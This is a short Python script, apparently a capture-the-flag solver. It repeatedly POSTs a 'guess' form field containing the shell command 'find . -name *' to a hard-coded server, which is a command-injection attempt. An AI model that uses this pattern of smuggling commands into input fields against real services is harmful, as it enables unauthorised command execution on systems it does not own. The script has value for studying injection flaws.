import requests

data = {'guess':'find . -name *'}
with requests.Session() as session:
    r = session.get("http://104.197.195.221:8084/")
    for _ in range(500):
        r = session.post("http://104.197.195.221:8084/",data=data)
    print(r.text)